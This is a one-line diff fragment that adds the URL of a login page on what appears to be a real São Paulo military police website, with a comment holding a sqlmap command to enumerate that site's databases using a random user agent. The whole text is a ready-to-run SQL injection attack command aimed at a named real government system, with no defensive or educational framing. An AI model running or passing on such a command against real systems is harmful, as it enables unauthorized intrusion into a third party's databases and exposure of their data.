@@ -1,0 +1,1 @@
+https://www.policiamilitar.sp.gov.br/servico-ao-pm/login.php?id=1 (GET)  # sqlmap.py -u https://www.policiamilitar.sp.gov.br/servico-ao-pm/login.php?id=1 -dbs --random-agent
